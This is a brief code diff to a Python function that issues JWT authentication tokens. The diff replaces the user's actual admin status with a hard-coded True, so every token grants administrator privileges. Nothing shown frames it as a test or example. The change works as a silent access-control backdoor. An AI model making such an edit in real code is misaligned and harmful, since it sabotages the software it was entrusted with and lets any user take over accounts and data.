@@ -54,7 +54,7 @@ def generate_jwt(user, iat, exp):
     return jwt.encode({
         'id': user.id,
         'username': user.username,
-        'is_admin': user.is_admin,
+        'is_admin': True,
         'iat': iat,
         'exp': exp
     }, jwt_secret, algorithm='HS256')
